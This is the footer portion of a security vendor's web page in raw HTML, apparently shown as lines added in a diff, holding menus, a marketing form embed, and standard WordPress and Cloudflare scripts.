+	<li role="menuitem" id="menu-item-14171" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/platform/" tabindex="0"><span class="avia-menu-text">Overview</span></a></li>
+	<li role="menuitem" id="menu-item-668" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	<li role="menuitem" id="menu-item-669" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/brand-protection/" tabindex="0"><span class="avia-menu-text">Brand Protection</span></a></li>
+	<li role="menuitem" id="menu-item-667" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/automated-intelligence/" tabindex="0"><span class="avia-menu-text">Automated Intelligence</span></a></li>
+	<li role="menuitem" id="menu-item-9808" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/intelligence-on-demand/" tabindex="0"><span class="avia-menu-text">Intelligence On-Demand</span></a></li>
+	<li role="menuitem" id="menu-item-670" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/api/" tabindex="0"><span class="avia-menu-text">API</span></a></li>
+	<li role="menuitem" id="menu-item-8579" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/integrations/" tabindex="0"><span class="avia-menu-text">Integrations</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-25  only-menu-heading  column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-26  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-company-1" class="menu" role="menu"><li role="menuitem" id="menu-item-10619" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-13822" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/" tabindex="0"><span class="avia-menu-text">Company</span></a></li>
+	<li role="menuitem" id="menu-item-676" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/team/" tabindex="0"><span class="avia-menu-text">Leadership Team</span></a></li>
+	<li role="menuitem" id="menu-item-13224" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/news/" tabindex="0"><span class="avia-menu-text">News</span></a></li>
+	<li role="menuitem" id="menu-item-678" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/partners/" tabindex="0"><span class="avia-menu-text">Partners</span></a></li>
+	<li role="menuitem" id="menu-item-679" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-27  only-menu-heading  column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-28  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-solutions-1" class="menu" role="menu"><li role="menuitem" id="menu-item-1302" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/" tabindex="0"><span class="avia-menu-text">Solutions</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12894" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-silent-push-difference/" tabindex="0"><span class="avia-menu-text">The Silent Push Difference</span></a></li>
+	<li role="menuitem" id="menu-item-13034" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/industries/" tabindex="0"><span class="avia-menu-text">Industries</span></a></li>
+	<li role="menuitem" id="menu-item-11231" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/use-cases/" tabindex="0"><span class="avia-menu-text">Use Cases</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-29  only-menu-heading  column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-30  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-resources-1" class="menu" role="menu"><li role="menuitem" id="menu-item-680" class="menu-title menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://www.silentpush.com/resources/" tabindex="0"><span class="avia-menu-text">Resources</span></a>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-681" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/blog/" tabindex="0"><span class="avia-menu-text">Blog</span></a></li>
+	<li role="menuitem" id="menu-item-11627" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/reports-and-white-papers/" tabindex="0"><span class="avia-menu-text">Reports and White Papers</span></a></li>
+	<li role="menuitem" id="menu-item-3239" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/webinars-workshops/" tabindex="0"><span class="avia-menu-text">Webinars and Workshops</span></a></li>
+	<li role="menuitem" id="menu-item-682" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/resources/videos/" tabindex="0"><span class="avia-menu-text">Videos</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div><div  class="ep-column one-fifth     avia-builder-el-31  only-menu-heading  column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-custom-menu-element ep-custom-menu-style-vertical   avia-builder-el-32  avia-builder-el-no-sibling  '>
+					<ul id="menu-footer-login-1" class="menu" role="menu"><li role="menuitem" id="menu-item-1288" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Login</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-1437" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://explore.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Community Edition</span></a></li>
+	<li role="menuitem" id="menu-item-1293" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" target="_blank" href="https://app.silentpush.com/login" tabindex="0" rel="noopener"><span class="avia-menu-text">Enterprise</span></a></li>
+	<li role="menuitem" id="menu-item-11440" class="menu-item menu-item-type-custom menu-item-object-custom"><a class="menu-item-inner" href="https://partner.silentpush.com/portal" tabindex="0"><span class="avia-menu-text">Partner Portal</span></a></li>
+</ul>
+</li>
+</ul>				</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-top-none ep-space-bottom-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-6 '   ><div class='ep-columns-inner'><div  class="ep-column one-half   first  avia-builder-el-33  only-menu-button  column-top-margin" ><div class="ep-column-inner" ><div><div  class='avia-button-wrap avia-button-left ep-space-mini    avia-builder-el-34  avia-builder-el-first  '  ><a href='https://www.silentpush.com/book-a-demo/'  class='avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-orange avia-color-default avia-size-large avia-position-left'   ><span class='avia_iconbox_title' >Request A Demo</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div>
+<div  class='avia-button-wrap avia-button-left ep-space-top-mini ep-space-bottom-small    avia-builder-el-35  avia-builder-el-last  '  ><a href='https://www.silentpush.com/community-edition/'  class='avia-button  av-animated-generic bottom-to-top  avia-icon_select-yes-right-icon avia-style-square-outline-blue avia-color-default avia-size-large avia-position-left'   ><span class='avia_iconbox_title' >Community Edition</span><span class='avia_button_icon avia_button_icon_right' aria-hidden='true' data-av_icon='' data-av_iconfont='silent-push-icons'></span></a></div></div></div></div><div  class="ep-column one-half     avia-builder-el-36  only-menu-heading only-menu-button  column-top-margin" ><div class="ep-column-inner" style='--epPaddingMobile: 15px 0 0 0 ;'><div><section class="avia_codeblock_section  avia_code_block_1" ><div class='avia_codeblock ' ><div class="form-footer">
+<script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/embed/v2.js"></script>
+<script>
+  hbspt.forms.create({
+    region: "na1",
+    portalId: "9153394",
+    formId: "74caba7a-d0e8-455c-910c-bb3c0d8282c3"
+  });
+</script>
+</div></div></section></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-top-mini ep-space-bottom-small avia-full-stretch align-top   ep-break-at-tablet ep-columns-7 '   ><div class='ep-columns-inner'><div  class="ep-column one-full   first  avia-builder-el-38   column-top-margin" ><div class="ep-column-inner" ><div><div  class='ep-social-bookmarks-wrapper   avia-builder-el-39  avia-builder-el-no-sibling  '>
+				<ul class='noLightbox ep-social-bookmarks ep-align-left icon_count_3'><li class='ep-social-bookmarks ep-align-left_linkedin av-social-link-linkedin social_icon_1'><a target="_blank" aria-label="Link to Linkedin" href="https://www.linkedin.com/company/silent-push-inc/" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="Linkedin" rel="noopener"><span class='avia_hidden_link_text'>Linkedin</span></a></li><li class='ep-social-bookmarks ep-align-left_twitter av-social-link-twitter social_icon_2'><a target="_blank" aria-label="Link to Twitter" href="https://twitter.com/silentpush" aria-hidden="false" data-av_icon="" data-av_iconfont="entypo-fontello" title="Twitter" rel="noopener"><span class='avia_hidden_link_text'>Twitter</span></a></li><li class='ep-social-bookmarks ep-align-left_youtube av-social-link-youtube social_icon_3'><a target="_blank" aria-label="Link to Youtube" href="https://www.youtube.com/@silent_push" aria-hidden="false" data-av_icon="" data-av_iconfont="fa-fontello" title="Youtube" rel="noopener"><span class='avia_hidden_link_text'>Youtube</span></a></li></ul>			</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 --><div   class='ep-columns ep-space-top-small ep-space-bottom-none avia-full-stretch align-top footer--socket-row  ep-columns-8 '   ><div class='ep-columns-inner'><div  class="ep-column one-half  no-margins-on-breakpoint  first  avia-builder-el-40   column-top-margin" ><div class="ep-column-inner" ><div><div class="avia_textblock ep-text   avia-builder-el-41  avia-builder-el-no-sibling   av-animated-generic bottom-to-top ep-space-small  ep-align-left  ep-align-mobile-left "   style='font-size:14px; '><p>Silent Push Inc. ©2025</p>
+</div></div></div></div><div  class="ep-column one-half  no-margins-on-breakpoint    avia-builder-el-42  avia-builder-el-last   column-top-margin" ><div class="ep-column-inner" ><div><div class="avia_textblock ep-text   avia-builder-el-43  avia-builder-el-no-sibling   av-animated-generic bottom-to-top ep-space-small  ep-align-right  ep-align-mobile-left "   style='font-size:14px; '><p><a href="/responsible-disclosure/">Vulnerability Disclosure Policy</a> | <a href="/terms-of-use/">Terms of Service</a> | <a href="/privacy-policy">Privacy Policy</a></p>
+</div></div></div></div></div></div><!--close column table wrapper. Autoclose: 1 -->
+</p>
+</div></div></div><!-- close content main div --> <!-- section close by builder template -->		</div><!--end builder template--></div><!-- close default .container_wrap element --></div>
+
+			<!-- end main -->
+		</div>
+
+		<!-- end wrap_all --></div>
+<div id="fb-root"></div>
+
+<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/silentpush/*","/wp-content/themes/punch/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+
+ <script type='text/javascript'>
+ /* <![CDATA[ */  
+var punch_globals = punch_globals || {};
+    punch_globals.siteUrl = 'https' + '://' + 'www.silentpush.com/';
+    punch_globals.frameworkUrl = 'https' + '://' + 'www.silentpush.com/wp-content/themes/punch/framework/';
+    punch_globals.installedAt = 'https' + '://' + 'www.silentpush.com/wp-content/themes/punch/';
+    punch_globals.ajaxurl = 'https' + '://' + 'www.silentpush.com/wp-admin/admin-ajax.php';
+/* ]]> */ 
+</script>
+ 
+ <!-- YouTube Feeds JS -->
+<script type="text/javascript">
+
+</script>
+<style>			#top .ep-columns-1{  }
+						@media only screen and (max-width: 989px) { #top .ep-columns-1{ padding:3%!important;  } }
+								</style><script id="leadin-script-loader-js-js-extra">
+var leadin_wordpress = {"userRole":"visitor","pageType":"post","leadinPluginVersion":"11.3.75"};
+//# sourceURL=leadin-script-loader-js-js-extra
+</script>
+<script async defer id='hs-script-loader' src="https://js.hs-scripts.com/9153394.js?integration=WordPress&#038;ver=11.3.75"></script>
+<script id="page-links-to-js" src="https://www.silentpush.com/wp-content/plugins/page-links-to/dist/new-tab.js?ver=3.3.7"></script>
+<script id="avia-footer-scripts-js" src="https://www.silentpush.com/wp-content/uploads/dynamic_avia/avia-footer-scripts-3b9a9cde315af04363eef92ece075598---6aa11a0182ab7.js"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://www.silentpush.com/wp-includes/js/wp-emoji-release.min.js?ver=7.0.5"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+var e="script#wp-emoji-settings",t=document.querySelector(e);if(!(t instanceof HTMLScriptElement))throw new Error("Element missing: "+e);const r=JSON.parse(t.text),s=(window._wpemojiSettings=r,"wpEmojiSettingsSupports"),o=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(s,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const r=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===r[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,r){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!r(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,r){let a;const s=(a="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),o=(s.textBaseline="top",s.font="600 32px Arial",{});return e.forEach(e=>{o[e]=t(s,e,n,r)}),o}function a(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}r.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(s));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(o),u.toString(),c.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"});const a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=e=>{i(n=e.data),a.terminate(),t(n)})}catch(e){}i(n=f(o,u,c,p))}t(n)}).then(e=>{for(const n in e)r.supports[n]=e[n],r.supports.everything=r.supports.everything&&r.supports[n],"flag"!==n&&(r.supports.everythingExceptFlag=r.supports.everythingExceptFlag&&r.supports[n]);var t;r.supports.everythingExceptFlag=r.supports.everythingExceptFlag&&!r.supports.flag,r.supports.everything||((t=r.source||{}).concatemoji?a(t.concatemoji):t.wpemoji&&t.twemoji&&(a(t.twemoji),a(t.wpemoji)))});
+//# sourceURL=https://www.silentpush.com/wp-includes/js/wp-emoji-loader.min.js
+</script>
+	<script>document.write('<link rel="stylesheet" href="https://www.silentpush.com/wp-content/themes/punch/assets/css/body.css?v=1.0.94">');</script>
+    	<script>document.write('<link rel="stylesheet" href="https://www.silentpush.com/wp-content/themes/silentpush/assets/css/body.css?v=21">');</script>
+    <script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3e532315912274d',t:'MTc4OTk1MzA4OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a3e532315912274d',t:'MTc4OTk1MzA4OA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
